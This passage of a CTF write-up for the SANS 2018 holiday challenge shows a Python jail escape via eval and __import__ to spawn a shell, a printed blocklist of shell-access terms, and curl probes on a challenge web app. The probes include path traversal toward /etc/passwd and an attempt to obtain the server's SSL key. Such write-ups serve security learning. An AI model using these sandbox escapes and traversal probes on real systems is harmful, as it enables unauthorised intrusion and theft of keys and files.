&lt;h3&gt;&lt;a class="toc-backref" href="#id34"&gt;SugarPlum Mary's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're trapped inside a Python interpreter, and we must escape and run a
program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;               :lllllllllllllllllllllllllllllllllllllllll,
               &amp;#39;lllllllllllllllllllllllllllllllllllllllll:
                clllllllllllllllllllllllllllllllllllllllll.
                &amp;#39;lllllllllllllllllllllllllllllllllllllllll:
                 ;lllllllllllllllllllllllllllllllllllllllll,
                  :lllllllllllllllllllllllllllllllllllllllll.
                   :lllllllllllllllllllllllllllllllllllllllll.
                    ;lllllllllllllllllllllllllllllllllllllllll&amp;#39;
                     &amp;#39;lllllllllllllllllllllllllllllllllllllllll;
                      .cllllllllllllllllllllllllllllllllllllllllc.
                      .:llllllllllllllllllllllllllllllllllllllllllc,.
                   .:llllllllllllllllllllllllllllllllllllllllllllllll;.
                .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,
              .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
             ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
           &amp;#39;llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc
          :lllllll:..,..&amp;#39;cllllllllllllllllllllllc&amp;#39;.,&amp;#39;.&amp;#39;clllllllllllllllllll;
        .clllllll&amp;#39;  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.
       .cllllllll.  oXX&amp;#39;  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll&amp;#39;
       clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,
      :llllllllllll;&amp;#39;..&amp;#39;:llllllllllllllllllllllll:&amp;#39;..&amp;#39;:lllllllllllllllllllll&amp;#39;
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.
     ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc
     clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.
     cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;
     :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:
     ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:
     .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,
      &amp;#39;llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
       ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,
        &amp;#39;llllllllllllllllcccccccc;&amp;#39;,.,clllllllllllllllllllllllllll,
         .cllllllc:::::;;,,,,&amp;#39;...&amp;#39;:c:;...&amp;#39;&amp;#39;,,;;;::::::lllllllllc,
           &amp;#39;cllllc::;::::cccccccccllc,,,,,,,&amp;#39;&amp;#39;,:::::::lllllll;.
             .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.
               .&amp;#39;:lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.
                   .,:llccccccccccllllXMMMMMMMMWl:;&amp;#39;.
                       .,,,,,,,,,,clll:::::::::;
                      &amp;#39;lllllllllc.    &amp;#39;,,,,,,,,.
                     lMMMMMMMMMW,    .ddddddddd.
                    kMMMMMMMMMX.     kMMMMMMMMK
                   &amp;#39;:::::::::,      .NWWWWWWWW:
                  &amp;#39;,,,,,,,,,.       .,,,,,,,,&amp;#39;
                .oooooooooo.        &amp;#39;,,,,,,,,.
               .NMMMMMMMMW;        cOOOOOOOOx
               0MMMMMMMMMc         NMMMMMMMMk
               ;;;;;;;;;&amp;#39;         .KKKKKKKKK:
              .,,,,,,,,,           ,,,,,,,,,.
              .ddddddddo           &amp;#39;,,,,,,,,.
               XMMMMMMMN           cKKKKKKKKK.
    .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....
      .,:ccccccccccccccc            &amp;#39;cccccccccc:::ccccc;.
         .:ccccccccccccc            .ccccccccccccccc:&amp;#39;.
           .;;;;;;;;;;;;            .ccccccccccccc;.
                                    ..............


I&amp;#39;m another elf in trouble,
Caught within this Python bubble.
Here I clench my merry elf fist -
Words get filtered by a black list!
Can&amp;#39;t remember how I got stuck,
Try it - maybe you&amp;#39;ll have more luck?
For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!
-SugarPlum Mary
To complete this challenge, escape Python
and run ./i_escaped
&amp;gt;&amp;gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I first tried to &lt;code&gt;import&lt;/code&gt; the &lt;code&gt;os&lt;/code&gt; module, but it was forbidden:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="go"&gt;Use of the command import is prohibited for this question.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Other functions and objects like that are unavailable, such as
&lt;code&gt;__builtins__&lt;/code&gt;, or &lt;code&gt;exec&lt;/code&gt;. However, &lt;code&gt;eval&lt;/code&gt; is available:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;built-in function eval&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since &lt;code&gt;eval&lt;/code&gt; takes a string as an argument, and evaluates it as Python
code, I thought I could bypass the restriction on &lt;code&gt;import&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;import os&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;Use of the command import is prohibited for this question.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, does not work. What if I try some string modification?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;impor&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;t os&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  File &lt;span class="nb"&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
         &lt;span class="o"&gt;^&lt;/span&gt;
&lt;span class="gr"&gt;SyntaxError&lt;/span&gt;: &lt;span class="n"&gt;invalid syntax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get a syntax error. However, it does not seem like the jail tries to block
our &lt;code&gt;import&lt;/code&gt;. So, what are some other ways you can &lt;code&gt;import&lt;/code&gt; in
Python, without calling &lt;code&gt;import&lt;/code&gt;? By searching for write-ups of Python
jail escapes, I found this &lt;a class="reference external" href="https://codezen.fr/2012/10/25/hack-lu-ctf-python-jail-writeup/"&gt;website&lt;/a&gt;
where the jail blocks &lt;code&gt;__import__&lt;/code&gt;. Let's see if our jail does also:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;__impo&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rt__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;built-in function __import__&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright! It's not blocked. We can use &lt;code&gt;__import__&lt;/code&gt; to import the
&lt;code&gt;os&lt;/code&gt; module, and the call &lt;code&gt;system&lt;/code&gt;, in order to gain a shell
access:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&amp;gt;&amp;gt; eval&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;__imp&amp;#39;&lt;/span&gt;+&lt;span class="s1"&gt;&amp;#39;ort__(&amp;quot;os&amp;quot;).system(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ls
&lt;span class="go"&gt;i_escaped&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ./i_escaped
&lt;span class="go"&gt;Loading, please wait......&lt;/span&gt;

&lt;span class="go"&gt;  ____        _   _&lt;/span&gt;
&lt;span class="go"&gt; |  _ \ _   _| |_| |__   ___  _ __&lt;/span&gt;
&lt;span class="go"&gt; | |_) | | | | __| &amp;#39;_ \ / _ \| &amp;#39;_ \&lt;/span&gt;
&lt;span class="go"&gt; |  __/| |_| | |_| | | | (_) | | | |&lt;/span&gt;
&lt;span class="go"&gt; |_|___ \__, |\__|_| |_|\___/|_| |_| _ _&lt;/span&gt;
&lt;span class="go"&gt; | ____||___/___ __ _ _ __   ___  __| | |&lt;/span&gt;
&lt;span class="go"&gt; |  _| / __|/ __/ _` | &amp;#39;_ \ / _ \/ _` | |&lt;/span&gt;
&lt;span class="go"&gt; | |___\__ \ (_| (_| | |_) |  __/ (_| |_|&lt;/span&gt;
&lt;span class="go"&gt; |_____|___/\___\__,_| .__/ \___|\__,_(_)&lt;/span&gt;
&lt;span class="go"&gt;                     |_|&lt;/span&gt;
&lt;span class="go"&gt;That&amp;#39;s some fancy Python hacking -&lt;/span&gt;
&lt;span class="go"&gt;You have sent that lizard packing!&lt;/span&gt;
&lt;span class="go"&gt;-SugarPlum Mary&lt;/span&gt;

&lt;span class="go"&gt;You escaped! Congratulations!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For those of you that are curious, here's the code of the jail, which includes
a solution:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! /usr/bin/env python3&lt;/span&gt;
&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;readline&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;code&lt;/span&gt;

&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;raw_input&lt;/span&gt;
&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39; [snip] &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;readfilter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;inline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#warning: if any of your imports enable the blacklisted items you will expose the question to the test taker.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;eachterm&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;whitelist&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;eachterm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;
    &lt;span class="c1"&gt;#warning: removing any of the following items from this list will likely expose the question.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;eachterm&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;restricted_terms&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;eachterm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Use of the command {0} is prohibited for this question.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;eachterm&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;inline&lt;/span&gt;

&lt;span class="n"&gt;whitelist&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;restricted_terms&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;import&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;pty&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;exec&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;compile&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;os.system&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;subprocess.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;reload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__builtins__&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__class__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;__mro__&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interact&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;readfunc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;readfilter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;local&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;locals&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="c1"&gt;#eval(&amp;quot;__im&amp;quot;+&amp;quot;port__(&amp;#39;p&amp;#39;+&amp;#39;ty&amp;#39;).s&amp;quot;+&amp;quot;pawn(&amp;#39;/bin/bash&amp;#39;)&amp;quot;)&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="packet-capture-and-analysis-website"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id35"&gt;Packet Capture and Analysis Website&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Santa has created a &lt;a class="reference external" href="https://packalyzer.kringlecastle.com/"&gt;packet capture and analysis web site&lt;/a&gt;, where people can upload PCAP files
to analyze them, or sniff traffic from the website for 20 seconds:&lt;/p&gt;
&lt;img alt="packalyzer_sniffing_traffic.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_sniffing_traffic.png" /&gt;
&lt;img alt="packalyzer_sniffing_done.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_sniffing_done.png" /&gt;
&lt;p&gt;Sniffing traffic from the website is interesting, because we could then see
other people's traffic. Unfortunately, the only traffic we see is HTTPS, which
means that it is encrypted. If we want to decrypt it, we have to find a way to
get the server's private SSL key.&lt;/p&gt;
&lt;p&gt;Since the website offers an upload functionality, I tried uploading invalid
PCAP files, in order to get code execution via a webshell. However, it did not
work. I also tried some path traversing in the &lt;code&gt;uploads&lt;/code&gt; directory, but
it did not work:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com/uploads/../../../../etc/passwd&amp;#39;&lt;/span&gt; -H &lt;span class="s1"&gt;&amp;#39;Cookie: PASESSION=287850715490745264942409679417652&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Not Found&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I tried some directory listing, but I also got an error there:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com/uploads/&amp;#39;&lt;/span&gt; -H &lt;span class="s1"&gt;&amp;#39;Cookie: PASESSION=287850715490745264942409679417652&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Error: EISDIR: illegal operation on a directory, read&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com/uploads/test&amp;#39;&lt;/span&gt; -H &lt;span class="s1"&gt;&amp;#39;Cookie: PASESSION=287850715490745264942409679417652&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Error: ENOENT: no such file or directory, open &amp;#39;/opt/http2/uploads//test&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ha! We got a different error message. The error codes &lt;code&gt;EISDIR&lt;/code&gt; and
&lt;code&gt;ENOENT&lt;/code&gt; indicates that the website is most likely based on Node.js. We
also learned that our web root is in &lt;code&gt;/opt/http2/&lt;/code&gt;. However, we're not
closer to our goal. So let's keep digging, by looking at the source code of the
website:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.ui.widget.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.iframe-transport.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/jquery.fileupload.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/custom.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/xss.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://packalyzer.kringlecastle.com:80/pub/js/loader.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's kind of odd: the website loads some JavaScript files. What's odd is that
it connects to the packalyzer website using HTTPS, but on the TCP port 80,
which is usually used for plaintext HTTP. Let's investigate a little bit more
on this port. Let's try to see the content of the &lt;code&gt;/pub/&lt;/code&gt; directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com:80/pub/&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;403 Forbidden&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;body bgcolor=&amp;quot;white&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;403 Forbidden&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.10.3&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Huh, we didn't get the same error message as before. Here, we can see that
we're communicating with an nginx server.&lt;/p&gt;
&lt;p&gt;What is most likely happening here is that there are two webservers:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;One listening on TCP/443, which runs the Node.js application.&lt;/li&gt;
&lt;li&gt;One listening on TCP/80, which is most likely an nginx reverse proxy that
serves static files to the web application.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That's interesting, maybe we can use the nginx reverse proxy to download the
server's SSL key. I tried several ideas, such as doing a path traversal to try
and download the SSL key, but it didn't work. So what other files can we try
to download. One of the most important files in a Node.js application is the
&lt;code&gt;app.js&lt;/code&gt; file, which holds most of the application logic. Let's try to
download it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com:80/app.js&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;#&lt;/span&gt;!/usr/bin/node
&lt;span class="go"&gt;//pcapalyzer - The web based packet analyzer&lt;/span&gt;
